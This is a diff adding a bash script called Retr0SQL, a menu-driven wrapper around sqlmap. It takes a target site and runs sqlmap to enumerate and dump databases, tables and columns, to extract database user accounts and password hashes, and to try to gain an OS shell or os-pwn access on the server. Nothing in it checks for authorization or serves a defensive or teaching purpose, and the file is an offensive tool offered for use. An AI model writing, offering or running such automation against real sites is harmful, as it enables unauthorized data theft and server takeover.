@@ -1,0 +1,123 @@
+#!/bin/bash
+
+source ~/Retr0SQL/config
+
+logo() {
+clear
+sleep 1
+figlet -f standard Retr0SQL | lolcat
+echo -e $yellow" Author: $author\n"
+echo -e $red"::${white} Description ${red}::\n"
+echo -e $white"Script made sqlmap easy to use. But sometime script will not show information.\n"
+}
+
+usage() {
+echo -e "+-----------------------------------+" | lolcat
+echo -e "+              Retr0SQL             +" | lolcat
+echo -e "+-----------------------------------+" | lolcat
+echo -e "+                                   +" | lolcat
+echo -e "+   [F] SQL Injection Site          +" | lolcat
+echo -e "+   [U] Grab DB Account & Password  +" | lolcat
+echo -e "+   [C] Bypass os-shell or os-pwn   +" | lolcat
+echo -e "+   [K] Scan Everything             +" | lolcat
+echo -e "+                                   +" | lolcat
+echo -e "+   [I] Credits                     +" | lolcat
+echo -e "+   [T] Exit                        +" | lolcat
+echo -e "+                                   +" | lolcat
+echo -e "+-----------------------------------+\n" | lolcat
+echo -e ${yellow}":: Select option ::\n${white}"
+read -p "Retr0SQL:> " choice
+
+if [ $choice == "F" ] || [ $choice == "f" ]; then
+scanner
+elif [ $choice == "U" ] || [ $choice == "u" ]; then
+sleep 1
+grab_module
+elif [ $choice == "C" ] || [ $choice == "c" ]; then
+sleep 1
+bypass
+elif [ $choice == "K" ] || [ $choice == "k" ]; then
+sleep 1
+read -p "Target site:> " site
+sqlmap -u $site -a --batch --output-dir=$output
+elif [ $choice == "I" ] || [ $choice == "i" ]; then
+sleep 1
+echo
+echo -e "Credits\n" | lolcat
+sleep 1.8
+echo -e "Retr0			Developer" | lolcat
+sleep 1.8
+echo -e "sqlmapproject		Developers of Sqlmap\n" | lolcat
+sleep 1.8
+clear
+logo
+usage
+elif [ $choice == "T" ] || [ $choice == "t" ]; then
+clear
+sleep 1
+figlet -f standard Bye Bye | lolcat
+echo
+sleep 1
+else
+exit 0
+fi
+
+}
+
+bypass() {
+sleep 0.8
+echo -e $yellow
+read -p "Target site:> " site
+sqlmap -u $site --os-shell --os-pwn --batch --output-dir=$output
+return_module
+}
+
+
+grab_module() {
+sleep 0.8
+echo -e $yellow
+read -p "Target site:> " site
+sqlmap -u $site --current-user --users --passwords --batch --output-dir=$output
+return_module
+}
+
+
+scanner() {
+sleep 0.8
+echo -e $yellow
+read -p "Target site:> " site
+sqlmap -u $site --dbs --batch --output-dir=$output
+sleep 0.8
+read -p "Database:> " db
+sqlmap -u $site -D $db --tables --output-dir=$output
+sleep 0.8
+read -p "Tables:> " tables
+sqlmap -u $site -D $db -T $tables --columns --output-dir=$output
+sleep 0.8
+read -p "Columns:> " columns
+sqlmap -u $site -D $db -T $tables -C $columns users --dump --output-dir=$output
+return_module
+
+
+}
+
+return_module() {
+
+echo -e ${yellow}
+read -p "Do you want return to back to main menu [Y/n]:> " back
+
+if [ $back == "Y" ] || [ $back == "y" ]; then
+sleep 0.8
+usage
+elif [ $back == "N" ] || [ $back == "n" ]; then
+sleep 1
+clear
+figlet -f standard Bye Bye | lolcat
+else
+exit 0
+fi
+
+}
+check_module
+logo
+usage
